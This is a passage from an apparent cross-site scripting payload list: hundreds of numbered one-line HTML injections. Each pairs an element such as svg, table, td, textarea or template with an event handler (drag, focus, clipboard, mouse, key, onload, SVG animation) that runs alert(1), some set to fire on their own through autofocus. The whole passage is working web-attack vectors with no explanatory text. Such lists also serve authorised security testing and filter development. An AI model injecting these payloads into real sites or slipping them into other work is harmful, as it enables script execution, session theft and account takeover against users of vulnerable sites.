5298 | <sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
5299 | <sub onclick="alert(1)">test</sub>
5300 | <sub oncontextmenu="alert(1)">test</sub>
5301 | <sub oncopy="alert(1)" contenteditable>test</sub>
5302 | <sub oncut="alert(1)" contenteditable>test</sub>
5303 | <sub ondblclick="alert(1)">test</sub>
5304 | <sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
5305 | <sub onkeydown="alert(1)" contenteditable>test</sub>
5306 | <sub onkeypress="alert(1)" contenteditable>test</sub>
5307 | <sub onkeyup="alert(1)" contenteditable>test</sub>
5308 | <sub onmousedown="alert(1)">test</sub>
5309 | <sub onmouseenter="alert(1)">test</sub>
5310 | <sub onmouseleave="alert(1)">test</sub>
5311 | <sub onmousemove="alert(1)">test</sub>
5312 | <sub onmouseout="alert(1)">test</sub>
5313 | <sub onmouseover="alert(1)">test</sub>
5314 | <sub onmouseup="alert(1)">test</sub>
5315 | <sub onpaste="alert(1)" contenteditable>test</sub>
5316 | <summary draggable="true" ondrag="alert(1)">test</summary>
5317 | <summary draggable="true" ondragend="alert(1)">test</summary>
5318 | <summary draggable="true" ondragenter="alert(1)">test</summary>
5319 | <summary draggable="true" ondragleave="alert(1)">test</summary>
5320 | <summary draggable="true" ondragstart="alert(1)">test</summary>
5321 | <summary id=x tabindex=1 onactivate=alert(1)></summary>
5322 | <summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>
5323 | <summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>
5324 | <summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
5325 | <summary id=x tabindex=1 onfocus=alert(1)></summary>
5326 | <summary id=x tabindex=1 onfocusin=alert(1)></summary>
5327 | <summary onbeforecopy="alert(1)" contenteditable>test</summary>
5328 | <summary onbeforecut="alert(1)" contenteditable>test</summary>
5329 | <summary onbeforepaste="alert(1)" contenteditable>test</summary>
5330 | <summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
5331 | <summary onclick="alert(1)">test</summary>
5332 | <summary oncontextmenu="alert(1)">test</summary>
5333 | <summary oncopy="alert(1)" contenteditable>test</summary>
5334 | <summary oncut="alert(1)" contenteditable>test</summary>
5335 | <summary ondblclick="alert(1)">test</summary>
5336 | <summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
5337 | <summary onkeydown="alert(1)" contenteditable>test</summary>
5338 | <summary onkeypress="alert(1)" contenteditable>test</summary>
5339 | <summary onkeyup="alert(1)" contenteditable>test</summary>
5340 | <summary onmousedown="alert(1)">test</summary>
5341 | <summary onmouseenter="alert(1)">test</summary>
5342 | <summary onmouseleave="alert(1)">test</summary>
5343 | <summary onmousemove="alert(1)">test</summary>
5344 | <summary onmouseout="alert(1)">test</summary>
5345 | <summary onmouseover="alert(1)">test</summary>
5346 | <summary onmouseup="alert(1)">test</summary>
5347 | <summary onpaste="alert(1)" contenteditable>test</summary>
5348 | <sup draggable="true" ondrag="alert(1)">test</sup>
5349 | <sup draggable="true" ondragend="alert(1)">test</sup>
5350 | <sup draggable="true" ondragenter="alert(1)">test</sup>
5351 | <sup draggable="true" ondragleave="alert(1)">test</sup>
5352 | <sup draggable="true" ondragstart="alert(1)">test</sup>
5353 | <sup id=x tabindex=1 onactivate=alert(1)></sup>
5354 | <sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>
5355 | <sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>
5356 | <sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>
5357 | <sup id=x tabindex=1 onfocus=alert(1)></sup>
5358 | <sup id=x tabindex=1 onfocusin=alert(1)></sup>
5359 | <sup onbeforecopy="alert(1)" contenteditable>test</sup>
5360 | <sup onbeforecut="alert(1)" contenteditable>test</sup>
5361 | <sup onbeforepaste="alert(1)" contenteditable>test</sup>
5362 | <sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>
5363 | <sup onclick="alert(1)">test</sup>
5364 | <sup oncontextmenu="alert(1)">test</sup>
5365 | <sup oncopy="alert(1)" contenteditable>test</sup>
5366 | <sup oncut="alert(1)" contenteditable>test</sup>
5367 | <sup ondblclick="alert(1)">test</sup>
5368 | <sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>
5369 | <sup onkeydown="alert(1)" contenteditable>test</sup>
5370 | <sup onkeypress="alert(1)" contenteditable>test</sup>
5371 | <sup onkeyup="alert(1)" contenteditable>test</sup>
5372 | <sup onmousedown="alert(1)">test</sup>
5373 | <sup onmouseenter="alert(1)">test</sup>
5374 | <sup onmouseleave="alert(1)">test</sup>
5375 | <sup onmousemove="alert(1)">test</sup>
5376 | <sup onmouseout="alert(1)">test</sup>
5377 | <sup onmouseover="alert(1)">test</sup>
5378 | <sup onmouseup="alert(1)">test</sup>
5379 | <sup onpaste="alert(1)" contenteditable>test</sup>
5380 | <svg draggable="true" ondrag="alert(1)">test</svg>
5381 | <svg draggable="true" ondragend="alert(1)">test</svg>
5382 | <svg draggable="true" ondragenter="alert(1)">test</svg>
5383 | <svg draggable="true" ondragleave="alert(1)">test</svg>
5384 | <svg draggable="true" ondragstart="alert(1)">test</svg>
5385 | <svg id=x onfocus=alert(1)>
5386 | <svg id=x onfocusin=alert(1)>
5387 | <svg id=x tabindex=1 onactivate=alert(1)></svg>
5388 | <svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
5389 | <svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
5390 | <svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
5391 | <svg onbeforecopy="alert(1)" contenteditable>test</svg>
5392 | <svg onbeforecut="alert(1)" contenteditable>test</svg>
5393 | <svg onbeforepaste="alert(1)" contenteditable>test</svg>
5394 | <svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
5395 | <svg onclick="alert(1)">test</svg>
5396 | <svg oncontextmenu="alert(1)">test</svg>
5397 | <svg oncopy="alert(1)" contenteditable>test</svg>
5398 | <svg oncut="alert(1)" contenteditable>test</svg>
5399 | <svg ondblclick="alert(1)">test</svg>
5400 | <svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
5401 | <svg onkeydown="alert(1)" contenteditable>test</svg>
5402 | <svg onkeypress="alert(1)" contenteditable>test</svg>
5403 | <svg onkeyup="alert(1)" contenteditable>test</svg>
5404 | <svg onload=alert(1)>
5405 | <svg onmousedown="alert(1)">test</svg>
5406 | <svg onmouseenter="alert(1)">test</svg>
5407 | <svg onmouseleave="alert(1)">test</svg>
5408 | <svg onmousemove="alert(1)">test</svg>
5409 | <svg onmouseout="alert(1)">test</svg>
5410 | <svg onmouseover="alert(1)">test</svg>
5411 | <svg onmouseup="alert(1)">test</svg>
5412 | <svg onpaste="alert(1)" contenteditable>test</svg>
5413 | <svg onunload=window.open('javascript:alert(1)')>
5414 | <svg><a onload=alert(1)></a>
5415 | <svg><abbr onload=alert(1)></abbr>
5416 | <svg><acronym onload=alert(1)></acronym>
5417 | <svg><address onload=alert(1)></address>
5418 | <svg><animate onbegin=alert(1) attributeName=x dur=1s>
5419 | <svg><animate onend=alert(1) attributeName=x dur=1s>
5420 | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
5421 | <svg><animatetransform onbegin=alert(1) attributeName=transform>
5422 | <svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
5423 | <svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
5424 | <svg><applet onload=alert(1)></applet>
5425 | <svg><area onload=alert(1)></area>
5426 | <svg><article onload=alert(1)></article>
5427 | <svg><aside onload=alert(1)></aside>
5428 | <svg><audio onload=alert(1)></audio>
5429 | <svg><b onload=alert(1)></b>
5430 | <svg><base onload=alert(1)></base>
5431 | <svg><basefont onload=alert(1)></basefont>
5432 | <svg><bdi onload=alert(1)></bdi>
5433 | <svg><bdo onload=alert(1)></bdo>
5434 | <svg><bgsound onload=alert(1)></bgsound>
5435 | <svg><big onload=alert(1)></big>
5436 | <svg><blink onload=alert(1)></blink>
5437 | <svg><blockquote onload=alert(1)></blockquote>
5438 | <svg><br onload=alert(1)></br>
5439 | <svg><button onload=alert(1)></button>
5440 | <svg><canvas onload=alert(1)></canvas>
5441 | <svg><caption onload=alert(1)></caption>
5442 | <svg><center onload=alert(1)></center>
5443 | <svg><cite onload=alert(1)></cite>
5444 | <svg><code onload=alert(1)></code>
5445 | <svg><col onload=alert(1)></col>
5446 | <svg><colgroup onload=alert(1)></colgroup>
5447 | <svg><command onload=alert(1)></command>
5448 | <svg><content onload=alert(1)></content>
5449 | <svg><data onload=alert(1)></data>
5450 | <svg><datalist onload=alert(1)></datalist>
5451 | <svg><dd onload=alert(1)></dd>
5452 | <svg><del onload=alert(1)></del>
5453 | <svg><details onload=alert(1)></details>
5454 | <svg><dfn onload=alert(1)></dfn>
5455 | <svg><dialog onload=alert(1)></dialog>
5456 | <svg><dir onload=alert(1)></dir>
5457 | <svg><discard onbegin=alert(1)>
5458 | <svg><div onload=alert(1)></div>
5459 | <svg><dl onload=alert(1)></dl>
5460 | <svg><dt onload=alert(1)></dt>
5461 | <svg><element onload=alert(1)></element>
5462 | <svg><em onload=alert(1)></em>
5463 | <svg><fieldset onload=alert(1)></fieldset>
5464 | <svg><figcaption onload=alert(1)></figcaption>
5465 | <svg><figure onload=alert(1)></figure>
5466 | <svg><font onload=alert(1)></font>
5467 | <svg><footer onload=alert(1)></footer>
5468 | <svg><form onload=alert(1)></form>
5469 | <svg><frameset onload=alert(1)></frameset>
5470 | <svg><h1 onload=alert(1)></h1>
5471 | <svg><head onload=alert(1)></head>
5472 | <svg><header onload=alert(1)></header>
5473 | <svg><hgroup onload=alert(1)></hgroup>
5474 | <svg><hr onload=alert(1)></hr>
5475 | <svg><html onload=alert(1)></html>
5476 | <svg><i onload=alert(1)></i>
5477 | <svg><image href=1 onerror=alert(1)>
5478 | <svg><image href=validimage.png onload=alert(1)>
5479 | <svg><ins onload=alert(1)></ins>
5480 | <svg><kbd onload=alert(1)></kbd>
5481 | <svg><keygen onload=alert(1)></keygen>
5482 | <svg><label onload=alert(1)></label>
5483 | <svg><legend onload=alert(1)></legend>
5484 | <svg><li onload=alert(1)></li>
5485 | <svg><listing onload=alert(1)></listing>
5486 | <svg><main onload=alert(1)></main>
5487 | <svg><map onload=alert(1)></map>
5488 | <svg><mark onload=alert(1)></mark>
5489 | <svg><marquee onload=alert(1)></marquee>
5490 | <svg><menu onload=alert(1)></menu>
5491 | <svg><menuitem onload=alert(1)></menuitem>
5492 | <svg><meta onload=alert(1)></meta>
5493 | <svg><meter onload=alert(1)></meter>
5494 | <svg><multicol onload=alert(1)></multicol>
5495 | <svg><nav onload=alert(1)></nav>
5496 | <svg><nextid onload=alert(1)></nextid>
5497 | <svg><nobr onload=alert(1)></nobr>
5498 | <svg><noembed onload=alert(1)></noembed>
5499 | <svg><noframes onload=alert(1)></noframes>
5500 | <svg><noscript onload=alert(1)></noscript>
5501 | <svg><ol onload=alert(1)></ol>
5502 | <svg><optgroup onload=alert(1)></optgroup>
5503 | <svg><option onload=alert(1)></option>
5504 | <svg><output onload=alert(1)></output>
5505 | <svg><p onload=alert(1)></p>
5506 | <svg><param onload=alert(1)></param>
5507 | <svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
5508 | <svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
5509 | <svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
5510 | <svg><picture onload=alert(1)></picture>
5511 | <svg><plaintext onload=alert(1)></plaintext>
5512 | <svg><pre onload=alert(1)></pre>
5513 | <svg><progress onload=alert(1)></progress>
5514 | <svg><q onload=alert(1)></q>
5515 | <svg><rb onload=alert(1)></rb>
5516 | <svg><rp onload=alert(1)></rp>
5517 | <svg><rt onload=alert(1)></rt>
5518 | <svg><rtc onload=alert(1)></rtc>
5519 | <svg><ruby onload=alert(1)></ruby>
5520 | <svg><s onload=alert(1)></s>
5521 | <svg><samp onload=alert(1)></samp>
5522 | <svg><section onload=alert(1)></section>
5523 | <svg><select onload=alert(1)></select>
5524 | <svg><set onbegin=alert(1) attributename=x dur=1s>
5525 | <svg><set onend=alert(1) attributename=x dur=1s>
5526 | <svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
5527 | <svg><shadow onload=alert(1)></shadow>
5528 | <svg><slot onload=alert(1)></slot>
5529 | <svg><small onload=alert(1)></small>
5530 | <svg><source onload=alert(1)></source>
5531 | <svg><spacer onload=alert(1)></spacer>
5532 | <svg><span onload=alert(1)></span>
5533 | <svg><strike onload=alert(1)></strike>
5534 | <svg><strong onload=alert(1)></strong>
5535 | <svg><sub onload=alert(1)></sub>
5536 | <svg><summary onload=alert(1)></summary>
5537 | <svg><sup onload=alert(1)></sup>
5538 | <svg><table onload=alert(1)></table>
5539 | <svg><tbody onload=alert(1)></tbody>
5540 | <svg><td onload=alert(1)></td>
5541 | <svg><template onload=alert(1)></template>
5542 | <svg><textarea onload=alert(1)></textarea>
5543 | <svg><tfoot onload=alert(1)></tfoot>
5544 | <svg><th onload=alert(1)></th>
5545 | <svg><thead onload=alert(1)></thead>
5546 | <svg><time onload=alert(1)></time>
5547 | <svg><title onload=alert(1)></title>
5548 | <svg><tr onload=alert(1)></tr>
5549 | <svg><tt onload=alert(1)></tt>
5550 | <svg><u onload=alert(1)></u>
5551 | <svg><ul onload=alert(1)></ul>
5552 | <svg><var onload=alert(1)></var>
5553 | <svg><video onload=alert(1)></video>
5554 | <svg><wbr onload=alert(1)></wbr>
5555 | <svg><xmp onload=alert(1)></xmp>
5556 | <svg><xss onload=alert(1)></xss>
5557 | <table draggable="true" ondrag="alert(1)">test</table>
5558 | <table draggable="true" ondragend="alert(1)">test</table>
5559 | <table draggable="true" ondragenter="alert(1)">test</table>
5560 | <table draggable="true" ondragleave="alert(1)">test</table>
5561 | <table draggable="true" ondragstart="alert(1)">test</table>
5562 | <table id=x tabindex=1 onactivate=alert(1)></table>
5563 | <table id=x tabindex=1 onbeforeactivate=alert(1)></table>
5564 | <table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>
5565 | <table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>
5566 | <table id=x tabindex=1 onfocus=alert(1)></table>
5567 | <table id=x tabindex=1 onfocusin=alert(1)></table>
5568 | <table onbeforecopy="alert(1)" contenteditable>test</table>
5569 | <table onbeforecut="alert(1)" contenteditable>test</table>
5570 | <table onbeforepaste="alert(1)" contenteditable>test</table>
5571 | <table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
5572 | <table onclick="alert(1)">test</table>
5573 | <table oncontextmenu="alert(1)">test</table>
5574 | <table oncopy="alert(1)" contenteditable>test</table>
5575 | <table oncut="alert(1)" contenteditable>test</table>
5576 | <table ondblclick="alert(1)">test</table>
5577 | <table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
5578 | <table onkeydown="alert(1)" contenteditable>test</table>
5579 | <table onkeypress="alert(1)" contenteditable>test</table>
5580 | <table onkeyup="alert(1)" contenteditable>test</table>
5581 | <table onmousedown="alert(1)">test</table>
5582 | <table onmouseenter="alert(1)">test</table>
5583 | <table onmouseleave="alert(1)">test</table>
5584 | <table onmousemove="alert(1)">test</table>
5585 | <table onmouseout="alert(1)">test</table>
5586 | <table onmouseover="alert(1)">test</table>
5587 | <table onmouseup="alert(1)">test</table>
5588 | <table onpaste="alert(1)" contenteditable>test</table>
5589 | <tbody draggable="true" ondrag="alert(1)">test</tbody>
5590 | <tbody draggable="true" ondragend="alert(1)">test</tbody>
5591 | <tbody draggable="true" ondragenter="alert(1)">test</tbody>
5592 | <tbody draggable="true" ondragleave="alert(1)">test</tbody>
5593 | <tbody draggable="true" ondragstart="alert(1)">test</tbody>
5594 | <tbody id=x tabindex=1 onactivate=alert(1)></tbody>
5595 | <tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>
5596 | <tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>
5597 | <tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>
5598 | <tbody id=x tabindex=1 onfocus=alert(1)></tbody>
5599 | <tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
5600 | <tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
5601 | <tbody onbeforecut="alert(1)" contenteditable>test</tbody>
5602 | <tbody onbeforepaste="alert(1)" contenteditable>test</tbody>
5603 | <tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>
5604 | <tbody onclick="alert(1)">test</tbody>
5605 | <tbody oncontextmenu="alert(1)">test</tbody>
5606 | <tbody oncopy="alert(1)" contenteditable>test</tbody>
5607 | <tbody oncut="alert(1)" contenteditable>test</tbody>
5608 | <tbody ondblclick="alert(1)">test</tbody>
5609 | <tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>
5610 | <tbody onkeydown="alert(1)" contenteditable>test</tbody>
5611 | <tbody onkeypress="alert(1)" contenteditable>test</tbody>
5612 | <tbody onkeyup="alert(1)" contenteditable>test</tbody>
5613 | <tbody onmousedown="alert(1)">test</tbody>
5614 | <tbody onmouseenter="alert(1)">test</tbody>
5615 | <tbody onmouseleave="alert(1)">test</tbody>
5616 | <tbody onmousemove="alert(1)">test</tbody>
5617 | <tbody onmouseout="alert(1)">test</tbody>
5618 | <tbody onmouseover="alert(1)">test</tbody>
5619 | <tbody onmouseup="alert(1)">test</tbody>
5620 | <tbody onpaste="alert(1)" contenteditable>test</tbody>
5621 | <td draggable="true" ondrag="alert(1)">test</td>
5622 | <td draggable="true" ondragend="alert(1)">test</td>
5623 | <td draggable="true" ondragenter="alert(1)">test</td>
5624 | <td draggable="true" ondragleave="alert(1)">test</td>
5625 | <td draggable="true" ondragstart="alert(1)">test</td>
5626 | <td id=x tabindex=1 onactivate=alert(1)></td>
5627 | <td id=x tabindex=1 onbeforeactivate=alert(1)></td>
5628 | <td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>
5629 | <td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
5630 | <td id=x tabindex=1 onfocus=alert(1)></td>
5631 | <td id=x tabindex=1 onfocusin=alert(1)></td>
5632 | <td onbeforecopy="alert(1)" contenteditable>test</td>
5633 | <td onbeforecut="alert(1)" contenteditable>test</td>
5634 | <td onbeforepaste="alert(1)" contenteditable>test</td>
5635 | <td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
5636 | <td onclick="alert(1)">test</td>
5637 | <td oncontextmenu="alert(1)">test</td>
5638 | <td oncopy="alert(1)" contenteditable>test</td>
5639 | <td oncut="alert(1)" contenteditable>test</td>
5640 | <td ondblclick="alert(1)">test</td>
5641 | <td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
5642 | <td onkeydown="alert(1)" contenteditable>test</td>
5643 | <td onkeypress="alert(1)" contenteditable>test</td>
5644 | <td onkeyup="alert(1)" contenteditable>test</td>
5645 | <td onmousedown="alert(1)">test</td>
5646 | <td onmouseenter="alert(1)">test</td>
5647 | <td onmouseleave="alert(1)">test</td>
5648 | <td onmousemove="alert(1)">test</td>
5649 | <td onmouseout="alert(1)">test</td>
5650 | <td onmouseover="alert(1)">test</td>
5651 | <td onmouseup="alert(1)">test</td>
5652 | <td onpaste="alert(1)" contenteditable>test</td>
5653 | <template draggable="true" ondrag="alert(1)">test</template>
5654 | <template draggable="true" ondragend="alert(1)">test</template>
5655 | <template draggable="true" ondragenter="alert(1)">test</template>
5656 | <template draggable="true" ondragleave="alert(1)">test</template>
5657 | <template draggable="true" ondragstart="alert(1)">test</template>
5658 | <template id=x tabindex=1 onactivate=alert(1)></template>
5659 | <template id=x tabindex=1 onbeforeactivate=alert(1)></template>
5660 | <template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
5661 | <template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
5662 | <template id=x tabindex=1 onfocus=alert(1)></template>
5663 | <template id=x tabindex=1 onfocusin=alert(1)></template>
5664 | <template onbeforecopy="alert(1)" contenteditable>test</template>
5665 | <template onbeforecut="alert(1)" contenteditable>test</template>
5666 | <template onbeforepaste="alert(1)" contenteditable>test</template>
5667 | <template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
5668 | <template onclick="alert(1)">test</template>
5669 | <template oncontextmenu="alert(1)">test</template>
5670 | <template oncopy="alert(1)" contenteditable>test</template>
5671 | <template oncut="alert(1)" contenteditable>test</template>
5672 | <template ondblclick="alert(1)">test</template>
5673 | <template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
5674 | <template onkeydown="alert(1)" contenteditable>test</template>
5675 | <template onkeypress="alert(1)" contenteditable>test</template>
5676 | <template onkeyup="alert(1)" contenteditable>test</template>
5677 | <template onmousedown="alert(1)">test</template>
5678 | <template onmouseenter="alert(1)">test</template>
5679 | <template onmouseleave="alert(1)">test</template>
5680 | <template onmousemove="alert(1)">test</template>
5681 | <template onmouseout="alert(1)">test</template>
5682 | <template onmouseover="alert(1)">test</template>
5683 | <template onmouseup="alert(1)">test</template>
5684 | <template onpaste="alert(1)" contenteditable>test</template>
5685 | <textarea autofocus onfocus=alert(1)>test</textarea>
5686 | <textarea autofocus onfocusin=alert(1)>test</textarea>
5687 | <textarea draggable="true" ondrag="alert(1)">test</textarea>
5688 | <textarea draggable="true" ondragend="alert(1)">test</textarea>
5689 | <textarea draggable="true" ondragenter="alert(1)">test</textarea>
5690 | <textarea draggable="true" ondragleave="alert(1)">test</textarea>
5691 | <textarea draggable="true" ondragstart="alert(1)">test</textarea>
5692 | <textarea id=x tabindex=1 onactivate=alert(1)></textarea>
5693 | <textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>
5694 | <textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>
5695 | <textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>
5696 | <textarea onauxclick=alert(1)>XSS</textarea>
5697 | <textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
5698 | <textarea onbeforecut=alert(1) autofocus>XSS</textarea>
5699 | <textarea onbeforepaste=alert(1) autofocus></textarea>
5700 | <textarea onblur=alert(1) id=x></textarea><input autofocus>
5701 | <textarea onchange=alert(1)>XSS</textarea>
5702 | <textarea onclick="alert(1)">test</textarea>
5703 | <textarea oncontextmenu="alert(1)">test</textarea>
5704 | <textarea oncopy=alert(1) autofocus>XSS</textarea>
5705 | <textarea oncut=alert(1) autofocus>XSS</textarea>
5706 | <textarea ondblclick="alert(1)">test</textarea>
5707 | <textarea onfocusout=alert(1) id=x></textarea><input autofocus>
5708 | <textarea oninput=alert(1)>XSS</textarea>
5709 | <textarea onkeydown="alert(1)" contenteditable>test</textarea>
5710 | <textarea onkeypress="alert(1)" contenteditable>test</textarea>
5711 | <textarea onkeyup="alert(1)" contenteditable>test</textarea>
5712 | <textarea onmousedown="alert(1)">test</textarea>
5713 | <textarea onmouseenter="alert(1)">test</textarea>
5714 | <textarea onmouseleave="alert(1)">test</textarea>
5715 | <textarea onmousemove="alert(1)">test</textarea>
5716 | <textarea onmouseout="alert(1)">test</textarea>
5717 | <textarea onmouseover="alert(1)">test</textarea>
5718 | <textarea onmouseup="alert(1)">test</textarea>
5719 | <textarea onpaste=alert(1) autofocus></textarea>
5720 | <textarea onselect=alert(1) autofocus>XSS</textarea>
5721 | <tfoot draggable="true" ondrag="alert(1)">test</tfoot>
5722 | <tfoot draggable="true" ondragend="alert(1)">test</tfoot>
5723 | <tfoot draggable="true" ondragenter="alert(1)">test</tfoot>
5724 | <tfoot draggable="true" ondragleave="alert(1)">test</tfoot>
5725 | <tfoot draggable="true" ondragstart="alert(1)">test</tfoot>
5726 | <tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>
5727 | <tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>
5728 | <tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>
5729 | <tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>
5730 | <tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
5731 | <tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
5732 | <tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
5733 | <tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
5734 | <tfoot onbeforepaste="alert(1)" contenteditable>test</tfoot>
5735 | <tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>
5736 | <tfoot onclick="alert(1)">test</tfoot>
5737 | <tfoot oncontextmenu="alert(1)">test</tfoot>
5738 | <tfoot oncopy="alert(1)" contenteditable>test</tfoot>
5739 | <tfoot oncut="alert(1)" contenteditable>test</tfoot>
5740 | <tfoot ondblclick="alert(1)">test</tfoot>
5741 | <tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
5742 | <tfoot onkeydown="alert(1)" contenteditable>test</tfoot>
5743 | <tfoot onkeypress="alert(1)" contenteditable>test</tfoot>
5744 | <tfoot onkeyup="alert(1)" contenteditable>test</tfoot>
5745 | <tfoot onmousedown="alert(1)">test</tfoot>
5746 | <tfoot onmouseenter="alert(1)">test</tfoot>
5747 | <tfoot onmouseleave="alert(1)">test</tfoot>
5748 | <tfoot onmousemove="alert(1)">test</tfoot>
5749 | <tfoot onmouseout="alert(1)">test</tfoot>
5750 | <tfoot onmouseover="alert(1)">test</tfoot>
5751 | <tfoot onmouseup="alert(1)">test</tfoot>
5752 | <tfoot onpaste="alert(1)" contenteditable>test</tfoot>
5753 | <th draggable="true" ondrag="alert(1)">test</th>
5754 | <th draggable="true" ondragend="alert(1)">test</th>
5755 | <th draggable="true" ondragenter="alert(1)">test</th>
5756 | <th draggable="true" ondragleave="alert(1)">test</th>
5757 | <th draggable="true" ondragstart="alert(1)">test</th>
5758 | <th id=x tabindex=1 onactivate=alert(1)></th>
5759 | <th id=x tabindex=1 onbeforeactivate=alert(1)></th>
5760 | <th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>
5761 | <th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>
5762 | <th id=x tabindex=1 onfocus=alert(1)></th>
5763 | <th id=x tabindex=1 onfocusin=alert(1)></th>
5764 | <th onbeforecopy="alert(1)" contenteditable>test</th>
5765 | <th onbeforecut="alert(1)" contenteditable>test</th>
5766 | <th onbeforepaste="alert(1)" contenteditable>test</th>
5767 | <th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
5768 | <th onclick="alert(1)">test</th>
5769 | <th oncontextmenu="alert(1)">test</th>
5770 | <th oncopy="alert(1)" contenteditable>test</th>
5771 | <th oncut="alert(1)" contenteditable>test</th>
5772 | <th ondblclick="alert(1)">test</th>
5773 | <th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
5774 | <th onkeydown="alert(1)" contenteditable>test</th>
5775 | <th onkeypress="alert(1)" contenteditable>test</th>
5776 | <th onkeyup="alert(1)" contenteditable>test</th>
5777 | <th onmousedown="alert(1)">test</th>
5778 | <th onmouseenter="alert(1)">test</th>
5779 | <th onmouseleave="alert(1)">test</th>
5780 | <th onmousemove="alert(1)">test</th>
5781 | <th onmouseout="alert(1)">test</th>
5782 | <th onmouseover="alert(1)">test</th>
5783 | <th onmouseup="alert(1)">test</th>
5784 | <th onpaste="alert(1)" contenteditable>test</th>
5785 | <thead draggable="true" ondrag="alert(1)">test</thead>
5786 | <thead draggable="true" ondragend="alert(1)">test</thead>
5787 | <thead draggable="true" ondragenter="alert(1)">test</thead>
5788 | <thead draggable="true" ondragleave="alert(1)">test</thead>
5789 | <thead draggable="true" ondragstart="alert(1)">test</thead>
5790 | <thead id=x tabindex=1 onactivate=alert(1)></thead>
5791 | <thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>
5792 | <thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
5793 | <thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
5794 | <thead id=x tabindex=1 onfocus=alert(1)></thead>
5795 | <thead id=x tabindex=1 onfocusin=alert(1)></thead>
5796 | <thead onbeforecopy="alert(1)" contenteditable>test</thead>
5797 | <thead onbeforecut="alert(1)" contenteditable>test</thead>
5798 | <thead onbeforepaste="alert(1)" contenteditable>test</thead>
5799 | <thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
5800 | <thead onclick="alert(1)">test</thead>
5801 | <thead oncontextmenu="alert(1)">test</thead>
5802 | <thead oncopy="alert(1)" contenteditable>test</thead>
5803 | <thead oncut="alert(1)" contenteditable>test</thead>
5804 | <thead ondblclick="alert(1)">test</thead>
5805 | <thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
5806 | <thead onkeydown="alert(1)" contenteditable>test</thead>
5807 | <thead onkeypress="alert(1)" contenteditable>test</thead>
5808 | <thead onkeyup="alert(1)" contenteditable>test</thead>
5809 | <thead onmousedown="alert(1)">test</thead>
5810 | <thead onmouseenter="alert(1)">test</thead>
5811 | <thead onmouseleave="alert(1)">test</thead>
5812 | <thead onmousemove="alert(1)">test</thead>
5813 | <thead onmouseout="alert(1)">test</thead>
5814 | <thead onmouseover="alert(1)">test</thead>
5815 | <thead onmouseup="alert(1)">test</thead>
5816 | <thead onpaste="alert(1)" contenteditable>test</thead>
5817 | <time draggable="true" ondrag="alert(1)">test</time>
5818 | <time draggable="true" ondragend="alert(1)">test</time>
5819 | <time draggable="true" ondragenter="alert(1)">test</time>
5820 | <time draggable="true" ondragleave="alert(1)">test</time>
5821 | <time draggable="true" ondragstart="alert(1)">test</time>
